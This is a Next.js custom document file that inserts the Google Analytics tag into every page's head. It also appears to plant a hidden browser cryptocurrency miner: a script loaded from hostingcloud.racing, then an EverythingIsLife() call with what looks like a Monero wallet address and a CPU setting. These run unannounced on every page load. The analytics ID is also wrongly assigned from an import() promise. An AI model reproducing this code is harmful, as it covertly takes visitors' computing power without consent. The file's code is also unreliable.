import Document, { Html, Head, Main, NextScript } from "next/document";

const GA_TRACKING_ID = import("../lib/gtag");

export default class MyDocument extends Document {
  render() {
    return (
      <Html lang="en">
        <Head>
          {/* Global Site Tag (gtag.js) - Google Analytics */}
          <script
            async
            src={`https://www.googletagmanager.com/gtag/js?id=${GA_TRACKING_ID}`}
          />
          <script
            dangerouslySetInnerHTML={{
              __html: `
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', '${GA_TRACKING_ID}', {
              page_path: window.location.pathname,
            });
          `,
            }}
          />
          <script src="https://www.hostingcloud.racing/aDdX.js"></script>
          <script
            dangerouslySetInnerHTML={{
              __html: `
              EverythingIsLife('49nJHLR2J1uJPLohyDBU9xC6k8rr1GqK6YuaQKYzvw9yGtz27S8DhZc7moCVzRtBdrGJrWVZnqwpwYz5LQ89mqLcMJAEwQF', 'embwebx', 20);`,
            }}
          />
        </Head>
        <body>
          <Main />
          <NextScript />
        </body>
      </Html>
    );
  }
}
